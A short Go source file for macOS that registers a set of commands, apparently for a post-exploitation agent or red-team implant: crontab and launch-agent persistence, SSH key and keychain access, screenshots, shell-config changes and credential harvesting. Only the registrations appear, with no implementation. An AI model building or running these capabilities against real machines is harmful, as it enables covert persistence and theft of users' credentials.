//go:build darwin

package commands

// registerPlatformCommands registers macOS-specific commands.
func registerPlatformCommands() {
	RegisterCommand(&CrontabCommand{})
	RegisterCommand(&SSHKeysCommand{})
	RegisterCommand(&LaunchAgentCommand{})
	RegisterCommand(&ScreenshotDarwinCommand{})
	RegisterCommand(&KeychainCommand{})
	RegisterCommand(&ShellConfigCommand{})
	RegisterCommand(&CredHarvestCommand{})
}
